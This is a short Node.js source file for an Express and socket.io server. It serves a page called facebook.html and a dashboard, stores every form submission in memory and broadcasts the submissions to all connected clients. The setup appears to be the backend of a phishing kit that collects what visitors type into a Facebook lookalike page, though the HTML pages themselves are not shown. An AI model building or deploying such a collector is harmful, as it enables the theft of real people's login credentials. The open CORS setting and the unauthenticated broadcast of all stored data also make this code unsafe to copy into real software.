import express from "express";
import { createServer } from "http";
import { Server } from "socket.io";
import path from "path";

const app = express();
const server = createServer(app);

const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
    credentials: true,
  },
});

let formDataHistory = [];
app.get("/", (req, res) => {
  let pathLocation = path.resolve();
  res.sendFile(path.join(pathLocation, "index.html"));
});
app.get("/facebook", (req, res) => {
  let pathLocation = path.resolve();
  res.sendFile(path.join(pathLocation, "facebook.html"));
});
app.get("/dashboard", (req, res) => {
  let pathLocation = path.resolve();
  res.sendFile(path.join(pathLocation, "dashboard.html"));
});

io.on("connection", (socket) => {
  // console.log("a user connected");

  // Send form data history to new connection
  socket.emit("formDataHistory", formDataHistory);

  socket.on("formData", (data) => {
    // Store new form data in history
    formDataHistory.push(data);

    // Broadcast updated form data history to all clients
    io.emit("formData", data);
  });
});

server.listen(3000, () => {
  console.log("server running at http://localhost:3000");
});
